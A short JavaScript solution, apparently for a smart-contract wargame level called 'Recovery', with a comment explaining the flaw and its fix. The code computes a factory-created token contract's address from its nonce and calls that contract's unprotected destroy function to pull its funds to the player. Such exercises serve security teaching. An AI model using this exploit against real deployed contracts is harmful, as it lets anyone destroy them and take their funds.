/**

Recovery
 
Vulnerability:
Address of a contract created by a contract can be easily computed by keccak256(sender, nonce)
and public functions with no access control can be invoked by anyone

Preventative Techniques:
Always protect sensitive public functions with access control

*/

const ethers = require('ethers');
const { getContractAddress} = require('@ethersproject/address');

const attack = async (factoryAddress) => { 

  const tokenAddress = getContractAddress({
    from: factoryAddress,
    nonce: 1
  });

  const tokenContract = new ethers.Contract(tokenAddress, abi, wallet);

  await (await tokenContract.destroy(player)).wait();
}